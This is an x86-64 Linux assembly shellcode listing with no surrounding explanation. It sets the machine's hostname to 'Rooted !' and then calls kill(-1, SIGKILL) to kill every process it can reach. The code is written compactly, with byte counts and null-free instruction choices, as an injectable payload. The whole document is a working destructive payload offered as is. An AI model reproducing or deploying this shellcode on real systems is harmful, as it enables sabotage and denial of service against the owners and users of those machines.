section .text
        global _start
 
    _start:
 
        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall
 
        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall